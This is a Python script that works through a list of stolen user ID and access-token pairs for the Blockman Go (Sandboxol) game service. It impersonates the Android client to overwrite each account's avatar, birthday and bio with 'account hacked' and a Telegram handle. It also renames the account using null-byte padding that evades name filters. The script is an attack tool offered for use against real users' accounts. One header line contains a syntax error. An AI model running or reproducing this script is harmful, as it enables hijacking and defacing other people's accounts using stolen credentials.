import random

import requests

with open("bot.txt", "r") as file:
    bot = file.readlines()

send = -1

while True:
    send += 1
    try:
        id, token = bot[send].strip().split(":")
    except:
        send = -1
        continue

    headers = {
        "userId": id,
        "packageName": "blockymods",
        "packageNameFull": "com.sandboxol.blockymods",
        "androidVersion": "30",
        "OS": "android",
        "appType": "android",
        "appLanguage": "en",
        "appVersion": "5212",
        "appVersionName": "2.104.2",
        "channel": "sandbox",
        "eventType": "app",
        "userLanguage": "en_US",
        "region": "RU",
        "clientType: "client",
        "env": "prd",
        "package_name_en": "com.sandboxol.blockymods",
        "md5": "5d0de77b0f4b93b44669f146e54b49d9",
        "Access-Token": token,
        "Content-Type": "application/json; charset=utf-8",
        "Host": "gw.sandboxol.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.11.0"
    }

    data = {
        "picUrl": random.choice([
            "http://staticgs.sandboxol.com/sandbox/avatar/1735765432742507.jpg",
            "http://staticgs.sandboxol.com/sandbox/avatar/1735765774322468.jpg",
            "http://staticgs.sandboxol.com/sandbox/avatar/1735766202722958.jpg",
            "http://staticgs.sandboxol.com/sandbox/avatar/1735766333999825.jpg",
            "http://staticgs.sandboxol.com/sandbox/avatar/1735766509212498.jpg"
        ]),
        "birthday": "0688-01-01",
        "details": "account hacked\ntelegram @nullowns\nhttрs://t.mе/nullowns"
    }

    try:
        response = requests.put("https://gw.sandboxol.com/user/api/v1/user/info", headers=headers, json=data).json()
    except:
        send -= 1
        continue

    if response["message"] == "SUCCESS":
        text = "notch"
        try:
            while True:
                name = "".join("\u0000" * random.randint(0, 3) + char + "\u0000" * random.randint(0, 3) for char in text)[:22]
                response = requests.put(f"https://gw.sandboxol.com/user/api/v3/user/nickName?newName={name}&oldName={response['data']['nickName']}", headers=headers).json()
                if response["message"] not in ["SUCCESS"]:
                    continue
                else:
                    break
        except:
            send -= 1
            continue

        print(response["message"] + f" | {id} | {send + 1}")
